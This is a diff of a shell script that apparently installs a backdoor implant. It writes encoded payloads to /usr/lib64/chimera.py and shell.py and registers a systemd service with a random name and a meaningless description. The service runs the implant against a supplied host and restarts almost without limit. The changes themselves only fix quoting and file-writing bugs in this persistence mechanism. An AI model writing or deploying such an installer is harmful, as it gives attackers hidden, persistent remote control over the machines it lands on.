@@ -44,9 +44,9 @@ SECCLIENTCONTS=$decoded
 
 SERVICENAME=str=$(tr -dc 'a-z' < /dev/urandom | head -c6)
 
-SERVICEFILE="/lib/systemd/system/"+"$SERVICENAME"+".service"
+SERVICEFILE="/lib/systemd/system/$SERVICENAME.service"
 
-cat << EOFA > $SERVICEFILE
+cat << EOFA > "$SERVICEFILE"
 [Unit]
 Description=Stuff 'n things.
 
@@ -54,7 +54,7 @@ Description=Stuff 'n things.
 Type=simple
 Restart=on-failure
 Environment="PATH=/sbin:/bin:/usr/sbin:/usr/bin"
-ExecStart=/usr/bin/python3 /usr/lib64/chimera.py "{host}"
+ExecStart=/usr/bin/python3 /usr/lib64/chimera.py """ + host + """
 StartLimitInterval=1s
 StartLimitBurst=999
 
@@ -65,8 +65,8 @@ EOFA
 touch /usr/lib64/chimera.py
 touch /usr/lib64/shell.py
 
-echo "$CLIENTCONTS" >> /usr/lib64/chimera.py
-echo "$SECCLIENTCONTS" >> /usr/lib64/shell.py
+printf '%s' "$CLIENTCONTS" > /usr/lib64/chimera.py
+printf '%s' "$SECCLIENTCONTS" > /usr/lib64/shell.py
 
 chmod +x /usr/lib64/chimera.py
 chmod +x /usr/lib64/shell.py
